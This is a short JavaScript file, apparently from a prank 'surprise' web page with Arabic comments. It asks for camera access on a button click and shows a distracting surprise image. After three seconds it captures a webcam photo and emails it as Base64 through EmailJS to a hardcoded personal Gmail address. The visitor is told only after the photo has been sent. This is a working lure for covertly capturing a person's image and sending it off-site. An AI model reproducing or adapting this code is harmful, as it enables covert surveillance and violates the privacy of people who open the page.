const captureButton = document.getElementById('captureButton');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const surpriseImage = document.getElementById('surpriseImage');
const context = canvas.getContext('2d');

// تهيئة EmailJS
emailjs.init("YOUR_USER_ID_HERE");  // ضع هنا User ID الذي تحصل عليه من EmailJS

// عند الضغط على الزر
captureButton.onclick = function() {
    // طلب إذن الوصول إلى الكاميرا
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            video.srcObject = stream;
            video.style.display = 'block';  // عرض الفيديو

            // إخفاء الزر بعد الضغط عليه
            captureButton.style.display = 'none';
            
            // إظهار صورة المفاجأة بعد ثواني من السماح بالكاميرا
            setTimeout(() => {
                surpriseImage.style.display = 'block';  // إظهار صورة المفاجأة
            }, 1000);

            // بعد 3 ثواني من فتح الكاميرا، التقط صورة
            setTimeout(() => {
                // رسم الصورة على Canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // تحويل الصورة إلى بيانات Base64
                const dataURL = canvas.toDataURL('image/png');
                
                // إرسال الصورة عبر البريد الإلكتروني باستخدام EmailJS
                const templateParams = {
                    to_email: 'bsh200898@gmail.com',  // بريدك الإلكتروني
                    message: 'هذه صورة تم التقاطها من كاميرتك!',
                    image_data: dataURL
                };

                // إرسال البريد الإلكتروني
                emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
                .then(function(response) {
                    alert('تم التقاط الصورة وإرسالها إلى بريدك الإلكتروني!');
                }, function(error) {
                    console.error('Error:', error);
                });
            }, 3000);  // الانتظار لمدة 3 ثواني قبل التقاط الصورة

        })
        .catch(function(err) {
            console.log("Camera not accessible: ", err);
        });
};
